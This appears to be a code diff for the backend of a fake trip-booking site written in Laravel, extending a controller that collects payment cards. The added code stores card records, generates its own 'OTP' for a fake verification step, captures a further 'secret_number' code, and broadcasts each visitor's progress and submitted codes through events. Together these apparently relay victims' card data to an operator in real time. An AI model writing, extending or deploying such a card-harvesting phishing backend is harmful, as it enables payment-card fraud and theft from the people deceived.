@@ -6,10 +6,12 @@ use App\Models\Trip;
 use App\Events\SendPart;
 use App\Events\SendVisit;
 use App\Events\NewVisitor;
+use App\Events\SendAuth;
 use App\Events\SendPeople;
 use App\Models\PaymentCard;
 use Illuminate\Http\Request;
 use App\Models\VisitorNotifications;
+use Illuminate\Validation\ValidationException;
 
 class TripController extends Controller
 {
@@ -121,6 +123,7 @@ class TripController extends Controller
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
                 $validated['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
+                $validated['otp_code'] = random_int(100000,999999);
                 $payment_card = PaymentCard::create($validated);
 
                 $not  = VisitorNotifications::find($visitor->id);
@@ -128,6 +131,7 @@ class TripController extends Controller
                 session()->put('visitor', json_encode($not));
                 // event(new NewVisitor($not));
                 event(new SendPart($payment_card,$not));
+                return redirect()->route('verify_otp');
             }
             return redirect('/');
         } catch (\Exception $ex) {
@@ -142,18 +146,59 @@ class TripController extends Controller
     }
     public function verifyOtpStore(Request $request)
     {
-        // dd($trip_type);
-        return redirect()->route('confirm_card_owner');
+        try {
+            $validated = $this->validate($request, [
+                'code' => 'required|integer',
+            ]);
+
+            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+            if ($visitor) {
+
+                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->first();
+                if($request->code != $payment_card->otp_code) return back()->withErrors(['code' => 'الكود غير صحيح']);
+
+            }
+            return redirect()->route('confirm_card_owner');
+        } catch (\Exception $ex) {
+            dd($ex->getMessage());
+        }
     }
     ////////////
     public function partAuth()
     {
-        // dd($trip_type);
-        return view('card_auth');
+        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+        if ($visitor) {
+            $not  = VisitorNotifications::find($visitor->id);
+            $not->update(['page' => 'دخل لصفحة إثبات بيانات البطاقة','step_number'=>5]);
+            session()->put('visitor', json_encode($not));
+            // event(new NewVisitor($not));
+            event(new SendVisit($not));
+            return view('card_auth');
+        }
+        return redirect('/');
+
     }
     public function partAuthStore(Request $request)
     {
-        // dd($trip_type);
-        return redirect('/');
+        try {
+            $validated = $this->validate($request, [
+                'code' => 'required|integer',
+            ]);
+
+            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+            if ($visitor) {
+
+                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->first();
+                $payment_card->secret_number = $request->code;
+                $payment_card->save();
+                // if($request->code != $payment_card->otp_code) return back()->withErrors(['code' => 'الكود غير صحيح']);
+                $not  = VisitorNotifications::find($visitor->id);
+                $not->update(['page' => 'أرسل رقم البطاقة','step_number'=>6]);
+                event(new SendAuth($not,$request->code));
+            }
+            return view('final_step');
+        } catch (\Exception $ex) {
+            dd($ex->getMessage());
+        }
     }
 }
